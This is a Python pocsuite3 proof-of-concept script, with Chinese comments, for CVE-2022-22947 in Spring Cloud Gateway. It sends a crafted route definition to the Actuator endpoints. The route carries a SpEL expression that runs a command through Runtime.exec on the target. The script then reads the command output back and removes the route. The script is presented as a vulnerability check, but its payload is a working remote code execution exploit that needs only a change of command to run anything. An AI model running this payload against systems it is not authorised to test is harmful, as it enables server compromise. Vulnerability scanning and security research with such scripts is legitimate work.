#! /usr/bin/env python3
# coding:utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
import random
import json
import re
import base64

class TestPOC(POCBase):
    vulID = '0'                                                            # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1.0'                                                        # 默认为1
    cve = 'CVE-2022-22947'                                                 # cve编号
    author = ['youyu']                                                     # PoC作者的大名
    vulDate = '2022-04-07'                                                 # 漏洞公开的时间,不知道就写今天
    createDate = '2022-03-03'                                              # 编写 PoC 的日期
    updateDate = '2022-04-07'                                              # PoC 更新的时间,默认和编写时间一样
    references = ['https://blog.csdn.net/qq_36197704/article/details/123344997']        # 漏洞地址来源,0day不用写
    name = 'CVE-2022-22947 RCE 检测脚本'                                     # PoC 名称
    appPowerLink = ''                                                      # 漏洞厂商主页地址
    appName = 'Spring_Cloud_Gateway'                                       # 漏洞应用名称
    appVersion = '3.1.x < 3.1.1, 3.0.x < 3.0.7'                            # 漏洞影响版本
    vulType = 'cmd-exec'       # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码'''                                           # 漏洞简要描述
    dork = {''}                            # fofa、钟馗之眼的编写方式
    suricata_request = ''''''                                             # suricata请求规则
    suricata_response = ''''''                                            # suricaet返回规则
    samples = ['']                                                        # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']                                               # PoC
    pocDesc = ''' poc的用法描述：python3 cli.py -r pocs/spring_cloud_gateway_rce_cve-2022-22947.py -u http://20.0.0.0:9999 --verify  '''                                        # POC用法描述

    def _verify(self):
        output = Output(self)
        result = {}
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        val = random.randint(100000, 999999)
        gateway = str(val)

        payload = '''{\r
          "id": "''' + gateway + '''",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"echo\\",\\"qwye123oasyd4u56\\"}).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }'''
        try:
            re1 = requests.post(url=self.url + "/actuator/gateway/routes/" + gateway, data=payload, headers=headers1,
                                json=json,
                                timeout=10, verify=False)
            re2 = requests.post(url=self.url + "/actuator/gateway/refresh", headers=headers2, timeout=10, verify=False)
            re3 = requests.get(url=self.url + "/actuator/gateway/routes/" + gateway, headers=headers2, timeout=10,
                               verify=False).text
            re4 = requests.delete(url=self.url + "/actuator/gateway/routes/" + gateway, headers=headers2, timeout=10,
                                  verify=False)
            re5 = requests.post(url=self.url + "/actuator/gateway/refresh", headers=headers2, timeout=10, verify=False)
           #  print(re3)
            if "qwye123oasyd4u56" in re3 and "route_id" in re3:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = "漏洞存在"
        except:
            return
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)
